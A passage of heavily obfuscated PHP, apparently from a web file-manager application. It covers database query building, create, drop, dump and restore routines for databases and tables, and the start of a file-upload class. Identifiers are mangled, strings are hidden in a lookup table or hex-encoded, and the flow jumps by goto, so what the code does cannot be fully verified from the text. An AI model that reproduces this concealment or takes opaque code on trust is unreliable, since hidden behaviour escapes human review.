parseUnion($E§ãéòßµ) { $aè£‡À×È£ =& $_SERVER[‡’¶øåüç˜]; if (empty($E§ãéòßµ)) { return $aè£‡À×È£[33]; } if (isset($E§ãéòßµ[$aè£‡À×È£[340]])) { $bËë­§–†™ = $aè£‡À×È£[954]; unset($E§ãéòßµ[$aè£‡À×È£[340]]); } else { $bËë­§–†™ = $aè£‡À×È£[955]; } foreach ($E§ãéòßµ as $d‡Ø‹„İ±») { $cÍéÈŠŒëš[] = $bËë­§–†™ . (is_array($d‡Ø‹„İ±») ? $this->buildSelectSql($d‡Ø‹„İ±») : $d‡Ø‹„İ±»); } return implode($aè£‡À×È£[50], $cÍéÈŠŒëš); } public function insert($f‰Œ²Üœ¦›, $eƒ„ùÛ¹ĞÙ = array(), $Aš¢í›Ï·£ = false) { goto B‘èğ½êë; f‘´À¹ëÅ…: foreach ($f‰Œ²Üœ¦› as $Dã«åöİÉÊ => $f„Šœâ°ÃÌ) { if (is_array($f„Šœâ°ÃÌ) && $C’›§Î‘ò§[289] == $f„Šœâ°ÃÌ[0]) { $f¢…­¤ìÄŠ[] = $this->parseKey($Dã«åöİÉÊ); $eˆÒù¯…ôÛ[] = $f„Šœâ°ÃÌ[1]; } elseif (is_scalar($f„Šœâ°ÃÌ) || is_null($f„Šœâ°ÃÌ)) { $f¢…­¤ìÄŠ[] = $this->parseKey($Dã«åöİÉÊ); $eˆÒù¯…ôÛ[] = $this->parseValue($f„Šœâ°ÃÌ); } } $FõÛè™Äï¤ = ($Aš¢í›Ï·£ ? $C’›§Î‘ò§[824] : $C’›§Î‘ò§[825]) . $C’›§Î‘ò§[826] . $this->parseTable($eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[271]]) . $C’›§Î‘ò§[820] . implode($C’›§Î‘ò§[47], $f¢…­¤ìÄŠ) . $C’›§Î‘ò§[821] . implode($C’›§Î‘ò§[47], $eˆÒù¯…ôÛ) . $C’›§Î‘ò§[822]; $FõÛè™Äï¤ .= $this->parseLock(isset($eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[777]]) ? $eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[777]] : !1); goto D¾÷šİ†É†; B‘èğ½êë: $C’›§Î‘ò§ =& $_SERVER[‡’¶øåüç˜]; $eˆÒù¯…ôÛ = $f¢…­¤ìÄŠ = array(); $this->model = $eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[273]]; goto f‘´À¹ëÅ…; D¾÷šİ†É†: $FõÛè™Äï¤ .= $this->parseComment(!empty($eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[345]]) ? $eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[345]] : $C’›§Î‘ò§[33]); return $this->execute($FõÛè™Äï¤, $this->parseBind(!empty($eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[277]]) ? $eƒ„ùÛ¹ĞÙ[$C’›§Î‘ò§[277]] : array())); goto c¡ù‰ Û½; c¡ù‰ Û½: } public function selectInsert($F—×æ¼›Œ„, $Dô¶œ›â‘Ü, $E…‹‚›„ = array()) { goto f·ƒ‡ëø¼; f·ƒ‡ëø¼: $aà†ñ–»ññ =& $_SERVER[‡’¶øåüç˜]; $this->model = $E…‹‚›„[$aà†ñ–»ññ[273]]; if (is_string($F—×æ¼›Œ„)) { $F—×æ¼›Œ„ = explode($aà†ñ–»ññ[47], $F—×æ¼›Œ„); } goto D¾ïÈÃƒ×Î; f²¨È¬ï: return $this->execute($EÅ²Ô“ïËä, $this->parseBind(!empty($E…‹‚›„[$aà†ñ–»ññ[277]]) ? $E…‹‚›„[$aà†ñ–»ññ[277]] : array())); goto d®„®Ä©‹ñ; D¾ïÈÃƒ×Î: array_walk($F—×æ¼›Œ„, array($this, $aà†ñ–»ññ[823])); $EÅ²Ô“ïËä = $aà†ñ–»ññ[956] . $this->parseTable($Dô¶œ›â‘Ü) . $aà†ñ–»ññ[820] . implode($aà†ñ–»ññ[47], $F—×æ¼›Œ„) . $aà†ñ–»ññ[935]; $EÅ²Ô“ïËä .= $this->buildSelectSql($E…‹‚›„); goto f²¨È¬ï; d®„®Ä©‹ñ: } public function update($e¼õ®¯³, $Dà„ò‘§ã„) { $aõŞèò‹ÀÔ =& $_SERVER[‡’¶øåüç˜]; $this->model = $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[273]]; $D¯öÏ¦Öãè = $aõŞèò‹ÀÔ[957] . $this->parseTable($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[271]]) . $this->parseSet($e¼õ®¯³) . $this->parseWhere(!empty($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[267]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[267]] : $aõŞèò‹ÀÔ[33]) . $this->parseOrder(!empty($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[354]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[354]] : $aõŞèò‹ÀÔ[33]) . $this->parseLimit(!empty($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[284]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[284]] : $aõŞèò‹ÀÔ[33]) . $this->parseLock(isset($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[777]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[777]] : !1) . $this->parseComment(!empty($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[345]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[345]] : $aõŞèò‹ÀÔ[33]); return $this->execute($D¯öÏ¦Öãè, $this->parseBind(!empty($Dà„ò‘§ã„[$aõŞèò‹ÀÔ[277]]) ? $Dà„ò‘§ã„[$aõŞèò‹ÀÔ[277]] : array())); } public function delete($d‚”ÎË¶‘ = array()) { $Bùøë—¨ÏĞ =& $_SERVER[‡’¶øåüç˜]; $this->model = $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[273]]; $b•†ï”ƒØí = $Bùøë—¨ÏĞ[958] . $this->parseTable($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[271]]) . $this->parseWhere(!empty($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[267]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[267]] : $Bùøë—¨ÏĞ[33]) . $this->parseOrder(!empty($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[354]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[354]] : $Bùøë—¨ÏĞ[33]) . $this->parseLimit(!empty($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[284]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[284]] : $Bùøë—¨ÏĞ[33]) . $this->parseLock(isset($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[777]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[777]] : !1) . $this->parseComment(!empty($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[345]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[345]] : $Bùøë—¨ÏĞ[33]); return $this->execute($b•†ï”ƒØí, $this->parseBind(!empty($d‚”ÎË¶‘[$Bùøë—¨ÏĞ[277]]) ? $d‚”ÎË¶‘[$Bùøë—¨ÏĞ[277]] : array())); } public function select($cÇÑğ„ ÓŞ = array()) { goto EãàÊºÂµ¤; EãàÊºÂµ¤: $A‹ÛƒÕ°“ =& $_SERVER[‡’¶øåüç˜]; $this->model = $cÇÑğ„ ÓŞ[$A‹ÛƒÕ°“[273]]; $fñÁÂÍğÓ› = $this->buildSelectSql($cÇÑğ„ ÓŞ); goto Eéå´Ç†›; Eéå´Ç†›: $f„ï¦öù’ = isset($cÇÑğ„ ÓŞ[$A‹ÛƒÕ°“[341]]) ? $cÇÑğ„ ÓŞ[$A‹ÛƒÕ°“[341]] : !1; if ($f„ï¦öù’) { $b†££­Æœô = is_string($f„ï¦öù’[$A‹ÛƒÕ°“[89]]) ? $f„ï¦öù’[$A‹ÛƒÕ°“[89]] : $A‹ÛƒÕ°“[959] . md5($fñÁÂÍğÓ›); $EÔš“èÙÔÉ = think_cache($b†££­Æœô, $A‹ÛƒÕ°“[33], $f„ï¦öù’); if (!1 !== $EÔš“èÙÔÉ) { return $EÔš“èÙÔÉ; } } $fÕ¢—¦ßòã = $this->query($fñÁÂÍğÓ›, $this->parseBind(!empty($cÇÑğ„ ÓŞ[$A‹ÛƒÕ°“[277]]) ? $cÇÑğ„ ÓŞ[$A‹ÛƒÕ°“[277]] : array())); goto BÍÆø‹Ù§¹; BÍÆø‹Ù§¹: if ($f„ï¦öù’ && !1 !== $fÕ¢—¦ßòã) { think_cache($b†££­Æœô, $fÕ¢—¦ßòã, $f„ï¦öù’); } return $fÕ¢—¦ßòã; goto B –µí¿Ëº; B –µí¿Ëº: } public function buildSelectSql($dá¾¯”çê¿ = array()) { goto AçøĞº©; AçøĞº©: $DŠ¶ª ¯ë× =& $_SERVER[‡’¶øåüç˜]; if (isset($dá¾¯”çê¿[$DŠ¶ª ¯ë×[344]])) { if (strpos($dá¾¯”çê¿[$DŠ¶ª ¯ë×[344]], $DŠ¶ª ¯ë×[47])) { list($FÚåöÒ¦ƒÅ, $e–Í½ˆÑ¢ó) = explode($DŠ¶ª ¯ë×[47], $dá¾¯”çê¿[$DŠ¶ª ¯ë×[344]]); } else { $FÚåöÒ¦ƒÅ = $dá¾¯”çê¿[$DŠ¶ª ¯ë×[344]]; } $FÚåöÒ¦ƒÅ = $FÚåöÒ¦ƒÅ ? $FÚåöÒ¦ƒÅ : 1; $e–Í½ˆÑ¢ó = isset($e–Í½ˆÑ¢ó) ? $e–Í½ˆÑ¢ó : (is_numeric($dá¾¯”çê¿[$DŠ¶ª ¯ë×[284]]) ? $dá¾¯”çê¿[$DŠ¶ª ¯ë×[284]] : 20); $C™Ó×å™Ğì = $e–Í½ˆÑ¢ó * ((int) $FÚåöÒ¦ƒÅ - 1); $dá¾¯”çê¿[$DŠ¶ª ¯ë×[284]] = $C™Ó×å™Ğì . $DŠ¶ª ¯ë×[47] . $e–Í½ˆÑ¢ó; } if (think_config($DŠ¶ª ¯ë×[960])) { $D“Ù­ò½¬ = $DŠ¶ª ¯ë×[961] . md5(serialize($dá¾¯”çê¿)); $f¦âÑñÚí = think_cache($D“Ù­ò½¬); if ($f¦âÑñÚí) { return $f¦âÑñÚí; } } goto cÅĞ¤¡‰; c½»õ·ğ: return $b„ä…·íº¹; goto d¤´Ã‰Œá†; cÅĞ¤¡‰: $b„ä…·íº¹ = $this->parseSql($this->selectSql, $dá¾¯”çê¿); $b„ä…·íº¹ .= $this->parseLock(isset($dá¾¯”çê¿[$DŠ¶ª ¯ë×[777]]) ? $dá¾¯”çê¿[$DŠ¶ª ¯ë×[777]] : !1); if (isset($D“Ù­ò½¬)) { think_cache($D“Ù­ò½¬, $b„ä…·íº¹); } goto c½»õ·ğ; d¤´Ã‰Œá†: } public function parseSql($C‘’ïæ‹³è, $dƒßÖÀ©ì¿ = array()) { $FÌìÑÔÉÈ =& $_SERVER[‡’¶øåüç˜]; $C‘’ïæ‹³è = str_replace(array($FÌìÑÔÉÈ[962], $FÌìÑÔÉÈ[963], $FÌìÑÔÉÈ[964], $FÌìÑÔÉÈ[965], $FÌìÑÔÉÈ[966], $FÌìÑÔÉÈ[967], $FÌìÑÔÉÈ[968], $FÌìÑÔÉÈ[969], $FÌìÑÔÉÈ[970], $FÌìÑÔÉÈ[971], $FÌìÑÔÉÈ[972]), array($this->parseTable("{$dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[271]]}"), $this->parseDistinct(isset($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[973]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[973]] : !1), $this->parseField(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[265]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[265]] : $FÌìÑÔÉÈ[180]), $this->parseJoin(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[274]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[274]] : $FÌìÑÔÉÈ[33]), $this->parseWhere(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[267]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[267]] : $FÌìÑÔÉÈ[33]), $this->parseGroup(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[974]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[974]] : $FÌìÑÔÉÈ[33]), $this->parseHaving(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[975]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[975]] : $FÌìÑÔÉÈ[33]), $this->parseOrder(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[354]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[354]] : $FÌìÑÔÉÈ[33]), $this->parseLimit(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[284]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[284]] : $FÌìÑÔÉÈ[33]), $this->parseUnion(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[339]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[339]] : $FÌìÑÔÉÈ[33]), $this->parseComment(!empty($dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[345]]) ? $dƒßÖÀ©ì¿[$FÌìÑÔÉÈ[345]] : $FÌìÑÔÉÈ[33])), $C‘’ïæ‹³è); return $C‘’ïæ‹³è; } public function getLastSql($dãçÍ®¬Ó = '') { return $dãçÍ®¬Ó ? $this->modelSql[$dãçÍ®¬Ó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($dÒ·ì¤¶êì) { return addslashes($dÒ·ì¤¶êì); } public function setModel($BâÒ¤Í‚¹Â) { $this->model = $BâÒ¤Í‚¹Â; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($f¨…¯°ÀÓø, $e—ãí“Ğùˆ = '') { $this->database = $f¨…¯°ÀÓø; $this->type = $e—ãí“Ğùˆ; } public function model($cÂ­É¯‡Ù¬ = '') { return new ModelBase($cÂ­É¯‡Ù¬, $_SERVER[‡’¶øåüç˜][33], $this->database); } public function db($F‘×À¦é… = false) { goto Eë±ãø˜—ª; f¾®•¼²£µ: $aÓ•ùŠ¡ÓÚ = $b—å°™¾[$Eè°ê±÷ˆ[888]]; $b—å°™¾[$Eè°ê±÷ˆ[888]] = $Eè°ê±÷ˆ[33]; if ($b—å°™¾[$Eè°ê±÷ˆ[728]] == $Eè°ê±÷ˆ[729]) { $DªÂÑ“ä‰½ = $b—å°™¾[$Eè°ê±÷ˆ[730]]; $b—å°™¾[$Eè°ê±÷ˆ[730]] = substr($DªÂÑ“ä‰½, 0, strrpos($DªÂÑ“ä‰½, $Eè°ê±÷ˆ[976])); } goto Bî®¦£‡Š; Bî®¦£‡Š: $this->database = $b—å°™¾; $c–‹œ‹’ÍÎ = $this->model()->db(); try { $d–İê—’„ï = $c–‹œ‹’ÍÎ->execute("\x73\150\157\167\40\x64\141\164\141\142\141\163\x65\x73\40\154\x69\x6b\145\x20\47{$aÓ•ùŠ¡ÓÚ}\x27"); } catch (Exception $D»Àµ±«ê°) { } goto E•›ˆÒ®Í; FŒ—ƒ´±“»: $this->database = $b—å°™¾; $c–‹œ‹’ÍÎ->execute("\x75\x73\145\40\x60{$aÓ•ùŠ¡ÓÚ}\140"); return $c–‹œ‹’ÍÎ; goto E×ÌÊÖõãÄ; Eë±ãø˜—ª: $Eè°ê±÷ˆ =& $_SERVER[‡’¶øåüç˜]; $b—å°™¾ = array_change_key_case($this->database); if ($this->type == $Eè°ê±÷ˆ[9] || !$F‘×À¦é…) { return $this->model()->db(); } goto f¾®•¼²£µ; E•›ˆÒ®Í: if (!$d–İê—’„ï) { $c–‹œ‹’ÍÎ->execute("\143\162\x65\x61\164\x65\40\x64\x61\164\x61\142\x61\163\145\x20\140{$aÓ•ùŠ¡ÓÚ}\140"); } $b—å°™¾[$Eè°ê±÷ˆ[888]] = $aÓ•ùŠ¡ÓÚ; if ($b—å°™¾[$Eè°ê±÷ˆ[728]] == $Eè°ê±÷ˆ[729]) { $b—å°™¾[$Eè°ê±÷ˆ[730]] .= $Eè°ê±÷ˆ[976] . $aÓ•ùŠ¡ÓÚ; } goto FŒ—ƒ´±“»; E×ÌÊÖõãÄ: } public function createTable($eÉÏÄºœÕ, $Eë¶¶¦àËŸ = null) { $Aßêæˆ¡öÁ =& $_SERVER[‡’¶øåüç˜]; if (!IO::exist($eÉÏÄºœÕ)) { ActionCall($Aßêæˆ¡öÁ[977], !0, 0); show_json(LNG($Aßêæˆ¡öÁ[978]), !1); } $aâ†Èê”ì = sqlSplit(IO::getContent($eÉÏÄºœÕ)); foreach ($aâ†Èê”ì as $E£Ïˆ«¯ñ) { if ($Eë¶¶¦àËŸ) { $fØ®¡ƒ­È‹ = stripos($E£Ïˆ«¯ñ, $Aßêæˆ¡öÁ[979]) === 0; if ($fØ®¡ƒ­È‹) { $Eë¶¶¦àËŸ->task[$Aßêæˆ¡öÁ[980]] += 1; } } $this->model()->db()->execute($E£Ïˆ«¯ñ); if ($Eë¶¶¦àËŸ && $fØ®¡ƒ­È‹) { preg_match($Aßêæˆ¡öÁ[981], $E£Ïˆ«¯ñ, $b§Òªğªä–); $Eë¶¶¦àËŸ->task[$Aßêæˆ¡öÁ[982]] = $b§Òªğªä–[1]; $Eë¶¶¦àËŸ->update(1); } } $this->taskToCache($Eë¶¶¦àËŸ); } public function insertTable($b¹”¥•¾”ˆ, $bŠåÆ†ÒéË = null) { $fÅÕÂïì¼İ =& $_SERVER[‡’¶øåüç˜]; $a¼ßã¼•æ = $this->model()->db(); $DÎ‚Ğà³Šª = $Cªù…¶ƒÙÈ ? array($Cªù…¶ƒÙÈ) : $a¼ßã¼•æ->getTables(); foreach ($b¹”¥•¾”ˆ as $B§Í×ùœš¸) { $Cªù…¶ƒÙÈ = basename($B§Í×ùœš¸, $fÅÕÂïì¼İ[723]); if (!in_array($Cªù…¶ƒÙÈ, $DÎ‚Ğà³Šª)) { continue; } if ($bŠåÆ†ÒéË) { $bŠåÆ†ÒéË->task[$fÅÕÂïì¼İ[982]] = $Cªù…¶ƒÙÈ; } if (get_filesize($B§Í×ùœš¸) == 0) { continue; } $AÓŞ‰ÔÖ ø = $this->sqlToDb($B§Í×ùœš¸, $bŠåÆ†ÒéË); if (!$AÓŞ‰ÔÖ ø) { ActionCall($fÅÕÂïì¼İ[977], !0, 0); show_json(LNG($fÅÕÂïì¼İ[983]) . "\x5b{$Cªù…¶ƒÙÈ}\x5d", !1); } } $this->taskToCache($bŠåÆ†ÒéË); } public function sqlFromDb($dáìÇ¡ÖÀ·, $E×¹¦èµË«, $cá°âº…Àê = null, $b›í‹Œ£ = null) { goto b’“ô¨àğˆ; b’“ô¨àğˆ: if ($cá°âº…Àê) { $cá°âº…Àê->task[$_SERVER[‡’¶øåüç˜][982]] = $dáìÇ¡ÖÀ·; } $fÎ¬º§Î‡ = $this->model($dáìÇ¡ÖÀ·); $EÉ®ÏïÕÁ‚ = 0; goto f…„áÄ¯§Û; fÏáñâ®™Ö: fclose($dš¯²¢È†È); return $EÉ®ÏïÕÁ‚; goto EÌÌ„ğ®ƒŸ; f…„áÄ¯§Û: $C¹‚óµÜ—Õ = 1; $f‚óï´´¦­ = 500; $dš¯²¢È†È = fopen($E×¹¦èµË«, $_SERVER[‡’¶øåüç˜][984]); goto DÔ§ãÌ©½; DÔ§ãÌ©½: $DÔ’Éô®á = $fÎ¬º§Î‡->getPk(); $e…íˆ‚ÇØˆ = $fÎ¬º§Î‡->getDbFields(); do { $F‰¦©ó’¾„ = $fÎ¬º§Î‡->field($e…íˆ‚ÇØˆ)->order($DÔ’Éô®á . $_SERVER[‡’¶øåüç˜][985])->selectPage($f‚óï´´¦­, $C¹‚óµÜ—Õ); $dššéËÁÔÔ = isset($F‰¦©ó’¾„[$_SERVER[‡’¶øåüç˜][355]][$_SERVER[‡’¶øåüç˜][357]]) ? $F‰¦©ó’¾„[$_SERVER[‡’¶øåüç˜][355]][$_SERVER[‡’¶øåüç˜][357]] : 0; $Eâí¼ Òé’ = !empty($F‰¦©ó’¾„[$_SERVER[‡’¶øåüç˜][358]]) ? $F‰¦©ó’¾„[$_SERVER[‡’¶øåüç˜][358]] : array(); if (!($F²ŞöñØµ¹ = count($Eâí¼ Òé’))) { break; } $C³‰‰Ê×ºô = array(); foreach ($Eâí¼ Òé’ as $B½Ôƒõ®Èó) { if ($dáìÇ¡ÖÀ· == $_SERVER[‡’¶øåüç˜][986] && $B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][29]] == $_SERVER[‡’¶øåüç˜][987]) { $DºÉÄÀØ–æ = json_decode($B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][363]], !0); if ($DºÉÄÀØ–æ[$_SERVER[‡’¶øåüç˜][28]] == date($_SERVER[‡’¶øåüç˜][696]) && !$DºÉÄÀØ–æ[$_SERVER[‡’¶øåüç˜][695]]) { continue; } } if ($b›í‹Œ£) { $B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][75]] = "\173\x69\157\72{$b›í‹Œ£}\x7d" . substr($B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][75]], strlen("\173\x69\157\72{$B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][749]]}\175")); $B½Ôƒõ®Èó[$_SERVER[‡’¶øåüç˜][749]] = $b›í‹Œ£; } $C³‰‰Ê×ºô[] = $_SERVER[‡’¶øåüç˜][988] . $this->sqlEncode($B½Ôƒõ®Èó) . $_SERVER[‡’¶øåüç˜][989]; } $E‰Îå…­Î = "\111\116\123\x45\x52\x54\40\x49\x4e\124\x4f\40\x60{$dáìÇ¡ÖÀ·}\x60\40\50\x60" . implode($_SERVER[‡’¶øåüç˜][990], $e…íˆ‚ÇØˆ) . $_SERVER[‡’¶øåüç˜][991]; fwrite($dš¯²¢È†È, $E‰Îå…­Î . implode($_SERVER[‡’¶øåüç˜][992], $C³‰‰Ê×ºô) . $_SERVER[‡’¶øåüç˜][67] . PHP_EOL); $C¹‚óµÜ—Õ++; $EÉ®ÏïÕÁ‚ += $F²ŞöñØµ¹; if ($cá°âº…Àê) { $cá°âº…Àê->update($F²ŞöñØµ¹); } } while ($C¹‚óµÜ—Õ <= $dššéËÁÔÔ); goto fÏáñâ®™Ö; EÌÌ„ğ®ƒŸ: } public function sqlToDb($b­Ø—¢ÉàÚ, $bä¶¹¡¡Ø› = null) { goto b‚ë˜­ïŸ·; b‚ë˜­ïŸ·: $D¶†¾ÙÀ¯Š =& $_SERVER[‡’¶øåüç˜]; $DŞæµİö»Ÿ = $this->model()->db(); $AíŒ÷ÆŞš“ = @fopen($b­Ø—¢ÉàÚ, $D¶†¾ÙÀ¯Š[993]); goto aô¾ï°ˆŞ; dÓ÷˜Ô–˜£: if (trim($e¹“ù‹†Ùâ)) { $e¹“ù‹†Ùâ = rtrim(trim($e¹“ù‹†Ùâ), $D¶†¾ÙÀ¯Š[67]); if (!$DŞæµİö»Ÿ->execute($e¹“ù‹†Ùâ)) { return !1; } if ($bä¶¹¡¡Ø›) { $bä¶¹¡¡Ø›->update($EâÌâ®ÁŠÈ - 1); } } return !0; goto C‘½İ»Æ¯”; aô¾ï°ˆŞ: if (!$AíŒ÷ÆŞš“) { return !1; } $EâÌâ®ÁŠÈ = 0; $e¹“ù‹†Ùâ = $D¶†¾ÙÀ¯Š[33]; goto Eö§…Æóé„; Eö§…Æóé„: $B©†§˜Ûà = 500 + 1; while (!feof($AíŒ÷ÆŞš“)) { if ($bä¶¹¡¡Ø› && $EâÌâ®ÁŠÈ != 0) { $bä¶¹¡¡Ø›->task[$D¶†¾ÙÀ¯Š[980]] += 1; } $EâÌâ®ÁŠÈ++; $B˜ÁÛ²˜ô = trim(fgets($AíŒ÷ÆŞš“)); $e¹“ù‹†Ùâ .= $D¶†¾ÙÀ¯Š[50] . $this->sqlDecode($B˜ÁÛ²˜ô, $this->type); if ($EâÌâ®ÁŠÈ == $B©†§˜Ûà) { $e¹“ù‹†Ùâ = rtrim(trim($e¹“ù‹†Ùâ), $D¶†¾ÙÀ¯Š[67]); if (!$DŞæµİö»Ÿ->execute($e¹“ù‹†Ùâ)) { return !1; } if ($bä¶¹¡¡Ø›) { $bä¶¹¡¡Ø›->update($EâÌâ®ÁŠÈ - 1); } $e¹“ù‹†Ùâ = $D¶†¾ÙÀ¯Š[33]; $EâÌâ®ÁŠÈ = 0; } } fclose($AíŒ÷ÆŞš“); goto dÓ÷˜Ô–˜£; C‘½İ»Æ¯”: } public function dropTable($c‡©„öÂª = null) { $aÇ¢Ï–ì = $this->model()->db(); $C…Ş„Š²´ = $c‡©„öÂª ? array($c‡©„öÂª) : $aÇ¢Ï–ì->getTables(); if (!$C…Ş„Š²´) { return; } foreach ($C…Ş„Š²´ as $c‡©„öÂª) { $aÇ¢Ï–ì->execute("\x64\162\157\160\x20\164\141\142\154\x65\40\151\x66\40\x65\170\x69\163\164\x73\x20\140{$c‡©„öÂª}\x60"); } } private function taskToCache($f©ºƒÌÒçñ = null) { $dºõ¬‹Ì =& $_SERVER[‡’¶øåüç˜]; if (!$f©ºƒÌÒçñ) { return; } $BÏ‹¥Š´ÂÅ = array($dºõ¬‹Ì[982] => $f©ºƒÌÒçñ->task[$dºõ¬‹Ì[982]], $dºõ¬‹Ì[980] => $f©ºƒÌÒçñ->task[$dºõ¬‹Ì[980]], $dºõ¬‹Ì[994] => $f©ºƒÌÒçñ->task[$dºõ¬‹Ì[994]]); if ($BÏ‹¥Š´ÂÅ[$dºõ¬‹Ì[980]] == $BÏ‹¥Š´ÂÅ[$dºõ¬‹Ì[994]]) { $BÏ‹¥Š´ÂÅ[$dºõ¬‹Ì[702]] = 1; } Cache::set($dºõ¬‹Ì[995] . $f©ºƒÌÒçñ->task[$dºõ¬‹Ì[371]], $BÏ‹¥Š´ÂÅ); $f©ºƒÌÒçñ->end(); } private function sqlEncode($f—Áğ¥œ) { $B–Ş‡„¦ =& $_SERVER[‡’¶øåüç˜]; $a—‡Ê®ƒ¬° = array(); foreach ($f—Áğ¥œ as $fèÅ“Ë¸«) { if (is_array($fèÅ“Ë¸«)) { $fèÅ“Ë¸« = json_encode_force($fèÅ“Ë¸«); } $fèÅ“Ë¸« = addslashes($fèÅ“Ë¸«); $fèÅ“Ë¸« = str_replace(array($B–Ş‡„¦[996], $B–Ş‡„¦[221]), array($B–Ş‡„¦[997], $B–Ş‡„¦[998]), $fèÅ“Ë¸«); $a—‡Ê®ƒ¬°[] = str_replace($B–Ş‡„¦[55], $B–Ş‡„¦[999], $fèÅ“Ë¸«); } return $B–Ş‡„¦[55] . implode($B–Ş‡„¦[1000], $a—‡Ê®ƒ¬°) . $B–Ş‡„¦[55]; } private function sqlDecode($Bìù£Ø½õ, $dË–§š¡Ğğ) { $D•ŒŒõ·ÔŞ =& $_SERVER[‡’¶øåüç˜]; $Bìù£Ø½õ = str_replace(array($D•ŒŒõ·ÔŞ[997], $D•ŒŒõ·ÔŞ[998]), array($D•ŒŒõ·ÔŞ[996], $D•ŒŒõ·ÔŞ[221]), $Bìù£Ø½õ); if ($dË–§š¡Ğğ == $D•ŒŒõ·ÔŞ[9]) { $Bìù£Ø½õ = stripslashes($Bìù£Ø½õ); } return $Bìù£Ø½õ; } } goto cä½‰ËÉõ; b÷”èòö: if (class_exists($_SERVER[‡’¶øåüç˜][1973])) { class Services_JSON_Error extends PEAR_Error { function __construct($dáÔº¯—Š± = "\165\x6e\153\156\157\x77\156\x20\x65\x72\162\x6f\162", $c¯’¼˜†‘• = null, $bÃÁêàÏ = null, $aóÍèöî© = null, $A’Á‚×½è­ = null) { parent::PEAR_Error($dáÔº¯—Š±, $c¯’¼˜†‘•, $bÃÁêàÏ, $aóÍèöî©, $A’Á‚×½è­); } } } else { class Services_JSON_Error { function __construct($E¨ÍÌù‘¸Í = "\165\156\x6b\156\x6f\167\156\40\x65\x72\x72\157\x72", $DØƒ•Í¿ÎÔ = null, $fÜáÒ±„•¯ = null, $B”à²“·ö = null, $E×õíÓ¸  = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto e —™ÃÂòİ; e —™ÃÂòİ: $f„ÅšîÑ¥ß =& $_SERVER[‡’¶øåüç˜]; global $in; $this->in =& $in; goto cÂ¼êäº¯Ÿ; d×†ø¼©Œ: $this->checkSize(); $this->tempPathInit(); goto dŠ§‹‘®Ş; cÂ¼êäº¯Ÿ: if (!empty($_FILES)) { $DŒ£ç¹Û… = $_FILES[$f„ÅšîÑ¥ß[171]]; $this->uploadFile = $DŒ£ç¹Û…[$f„ÅšîÑ¥ß[1974]]; if (!$this->uploadFile && $DŒ£ç¹Û…[$f„ÅšîÑ¥ß[1225]] > 0) { show_json($this->errorInfo($DŒ£ç¹Û…[$f„ÅšîÑ¥ß[1225]]), !1); } } else { if (isset($in[$f„ÅšîÑ¥ß[398]])) { $this->uploadFile = isset($in[$f„ÅšîÑ¥ß[1975]]) ? $f„ÅšîÑ¥ß[1976] : $f„ÅšîÑ¥ß[1819]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto d×†ø¼©Œ; dŠ§‹‘®Ş: } public function upload() { goto FÒñĞİİâ¬; bà…ÚÑŸ„¨: $A¤‚Ïìå‚ = $this->writeTo($a•Å¼—²í, $EİßÊ÷Ãƒ, $this->tempFile); 